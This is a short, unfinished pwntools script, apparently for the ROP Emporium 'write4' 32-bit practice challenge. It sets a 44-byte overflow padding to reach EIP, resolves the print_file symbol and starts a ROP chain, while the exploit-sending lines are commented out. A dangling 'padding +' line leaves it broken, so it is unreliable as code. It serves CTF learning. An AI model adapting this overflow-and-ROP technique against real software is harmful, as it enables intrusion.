from pwn import *

elf = context.binary = ELF('/home/saudi/Desktop/CTF/CTF scripts/Pwn/RopEmporium/write4/write32/write432')



#bytes to reach the EIP
padding = b"A" *44
print_f = elf.sym.print_file
info(str(hex(print_f)))
rop = ROP(elf)
padding + 


# io = process(elf.path)
# io.recvuntil('> ')
# exploit = padding + rop.chain()
# io.sendline(exploit)
# flag = io.recvall()
# success(flag)

